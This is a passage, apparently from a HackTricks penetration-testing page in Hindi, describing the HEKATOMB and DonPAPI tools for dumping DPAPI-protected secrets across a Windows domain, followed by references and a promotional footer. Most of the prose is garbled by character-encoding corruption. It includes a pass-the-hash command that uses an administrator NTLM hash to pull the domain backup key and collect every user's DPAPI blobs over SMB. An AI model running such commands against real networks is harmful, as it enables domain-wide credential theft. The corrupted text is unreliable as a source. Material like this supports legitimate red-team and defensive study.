[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) рдПрдХ рдЯреВрд▓ рд╣реИ рдЬреЛ LDAP рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдФрд░ RPC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдмреИрдХрдЕрдк рдХреБрдВрдЬреА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд┐рд░ рд╕рднреА рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЗ рдЖрдИрдкреА тАЛтАЛрдкрддреЗ рдХреЛ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд▓рд╛рдПрдЧрд╛ рдФрд░ рдбреЛрдореЗрди рдмреИрдХрдЕрдк рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╕рднреА DPAPI рдмреНрд▓реЙрдмреНрд╕ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдкрд░ smbclient рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP рдХрдВрдкреНрдпреВрдЯрд░ рд╕реВрдЪреА рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЧрдП рдХрдВрдкреНрдпреВрдЯрд░ рд╕реВрдЪреА рдХреЗ рд╕рд╛рде рдЖрдк рдЙрдиреНрд╣реЗрдВ рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж рд╣рд░ рд╕рдм рдиреЗрдЯрд╡рд░реНрдХ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ!

"рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред рд╕рднреА рдХреЛ рд╣реИрдХ рдХрд░реЛред"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ DPAPI рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдирд╛ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рд╡рд┐рд╖рдп рдореЗрдВ рдЯреЗрдХреНрдиреЛрд▓реЙрдЬреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд╛рди рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR** рдЬрдорд╛ рдХрд░рдХреЗ [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдбрд╛рд▓рдХрд░ред**

</details>
